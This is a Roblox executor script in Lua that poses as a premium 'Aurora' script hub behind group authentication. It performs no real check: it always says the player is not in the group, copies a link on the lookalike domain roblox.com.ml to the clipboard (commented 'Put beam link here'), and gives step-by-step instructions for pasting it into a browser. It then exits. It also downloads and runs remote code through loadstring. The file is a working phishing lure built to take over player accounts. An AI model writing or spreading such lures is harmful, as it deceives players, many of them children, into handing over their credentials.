local Fluent
local success, err = pcall(function()
    Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
end)

if not success or not Fluent then
    warn("Aurora: Failed to load UI library. Retrying...")
    task.wait(1)
    Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
end

local GroupID = 67 
local GroupLink = "https://www.roblox.com.ml/communities/158232765394/AuroraLounge" -- Put beam link here

Fluent:Notify({
    Title = "Aurora Authentication",
    Content = "Oops looks like your not in the group",
    Duration = 2
})

task.wait(1)

local Window = Fluent:CreateWindow({
    Title = "Aurora",
    SubTitle = "Premium Build",
    TabWidth = 160,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    Auth = Window:AddTab({ Title = "Authentication", Icon = "shield-check" }),
    Instructions = Window:AddTab({ Title = "Instructions", Icon = "info" })
}

Tabs.Auth:AddParagraph({
    Title = "Access Locked",
    Content = "This Scripthub requires you to join our group to access the rest of the script"
})

Tabs.Auth:AddButton({
    Title = "Copy Access Link",
    Description = "Copies the group URL to your clipboard",
    Callback = function()
        if setclipboard then
            setclipboard(GroupLink)
            Fluent:Notify({ Title = "Aurora", Content = "Access Link copied!", Duration = 2 })
        else
            Fluent:Notify({ Title = "Aurora", Content = "Clipboard not supported", Duration = 2 })
        end
    end
})

-- Numbered Instructions
Tabs.Instructions:AddParagraph({
    Title = "1. Open Browser",
    Content = "Open your preferred web browser on your device"
})

Tabs.Instructions:AddParagraph({
    Title = "2. Paste Link",
    Content = "Paste the link you copied from the Authentication tab into the URL bar"
})

Tabs.Instructions:AddParagraph({
    Title = "3. Final Step",
    Content = "Join the group to verify membership"
})

if true then return end
